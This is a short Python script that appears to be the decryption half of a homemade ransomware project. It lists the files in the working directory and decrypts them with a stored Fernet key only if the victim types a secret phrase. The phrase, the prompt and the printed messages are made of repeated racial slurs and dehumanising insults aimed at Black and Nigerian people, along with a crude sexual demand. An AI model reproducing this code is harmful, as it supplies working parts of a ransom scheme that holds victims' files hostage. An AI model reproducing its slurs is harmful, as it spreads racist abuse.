#!/usr/bin/env pyton3
import os
from cryptography.fernet import Fernet


files = []

for file in os.listdir():
	if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py" :
		continue
	if os.path.isfile(file):
		files.append(file)


print(files)




with open("thekey.key", "rb") as key:
	secretkey = key.read()

secretphrase = "NIGGA"

user_phrase = input("ENTER THE SECRET PHRASE NIGGA IF YOU WANT YOUR FILES BACK\n")

if user_phrase == secretphrase:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
		print("CONGRATS NIGGA HERE HAVE YOUR FILES BACK")
else:
	print("HAHAHAHAAHAH DUMB STUPID NIGGA MONKEY NIGERIAN PLANTATION WORKER  WRONG PHRASE GIMME MORE FEET PIX")
